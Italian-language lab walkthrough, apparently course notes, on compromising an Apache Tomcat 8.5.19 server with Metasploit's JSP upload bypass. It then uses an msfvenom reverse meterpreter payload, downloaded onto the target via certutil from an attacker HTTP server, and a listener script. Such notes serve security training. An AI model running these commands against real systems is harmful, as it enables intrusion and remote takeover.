# Exploiting A Vulnerable Apache Tomcat Web Server

<figure><img src="../../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>

## Preparazione ambiente MSF

```
service postgresql start
msfconsole
workspace -a tomcat
setg RHOSTS 10.2.20.126
workspace
```

<figure><img src="../../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>

## Port scanning & enumeration

```
db_nmap -sS -sV -O 10.2.20.126
services
```

<figure><img src="../../../.gitbook/assets/image (1085).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>

## Exploit Apache Tomcat 8.5.19 con modulo MSF

```
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
show options
//verifichiamo con il browser l'URI di Apache Tomcat
info
set payload java/jsp_shell_bind_tcp
set SHELL cmd //cmd perché è Windows, vogliamo una shell Windows in risposta
```

<figure><img src="../../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1089).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1090).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

Dobbiamo usare un payload sotto forma di una JSP. Come target possiamo impostare Java Windows o Java Linux.

Impostiamo il payload Java unstaged:

<figure><img src="../../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1094).png" alt=""><figcaption></figcaption></figure>

Se non funziona interrompiamo e rieseguiamo:

<figure><img src="../../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

Vorremmo però avere una meterpreter shell più che cmd shell.

Mettiamo in background la sessione e se analizziamo le sessioni attive vediamo che è il tipo di payload è java/linux, quindi anche se provassimo a fare upgrade della shell in meterpreter tramite un post exploitation module, questo non funzionerebbe.

<figure><img src="../../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

## Generare un Windows meterpreter payload con Msfvenom

```
// su un nuovo tab del terminale, al di fuori di msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.4 LPORT=1234 -f exe > meterpreter.exe
```

<figure><img src="../../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

### Upload sul target e set dell'handler

```
sudo python -m SimpleHttpServer 80
// Torniamo ora al tab del terminale con msfconsole e la sessione aperta, riprendiamo la sessione
    sessions 1
    //scarichiamo il file con certutil preinstallato in windows cmd
    certutil -urlcache  http://10.10.5.4:80/meterpreter.exe meterpreter.exe
    dir
// Sul tab con aperto il web server python possiamo terminare con CTRL+C
// Su questo tab fuori da msfconsole impostiamo ora l'handler, creando un piccolo metasploit rc script
vim handler.rc
    use multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST //IP dell'attaccante
    set LPORT 1234 //la porta inserita nella creazione del payload con msfvenom
    run
msfconsole -r handler.rc
```

<figure><img src="../../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1104).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

### Esecuzione e ricezione risposta

```
// Torniamo al primo tab con la connessione aperta al target
.\meterpreter.exe
// Andiamo al secondo tab con il listener in ascolto per la connessione di ritorno dal target
sysinfo
```

<figure><img src="../../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1109).png" alt=""><figcaption></figcaption></figure>

Siamo quindi riusciti ad ottenere una meterpreter session da un exploit che non ci consentiva di aprirla automaticamente.

Abbiamo fatto ciò utilizzando le tecniche che abbiamo imparato in questa sezione tra cui la creazione di un payload con msfvenom, il trasferimento/upload dei file tramite server http in python, la creazione di un resource script per il listener in metasploit framework.
